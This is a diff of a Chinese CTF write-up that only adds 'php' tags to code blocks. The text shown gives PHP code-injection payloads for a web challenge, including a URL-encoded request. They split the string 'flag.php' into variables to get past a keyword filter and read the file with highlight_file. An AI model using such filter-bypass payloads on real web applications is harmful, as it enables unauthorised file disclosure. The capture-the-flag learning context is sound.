@@ -26,11 +26,11 @@ if(isset($_GET['c'])){
 ```
 但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：
 
-```
+```php
 $a='fla'; $b='g.php'; highlight_file($a.$b);
 ```
 改造一下加上第三个变量：
-```
+```php
 $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 ```
 
@@ -39,7 +39,7 @@ $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 /?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
 ```
 或者我们可以把空格去掉：
-```
+```php
 $a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
 ```
 浏览器自动 URL 编码后的 Payload 会更简单明了一点：
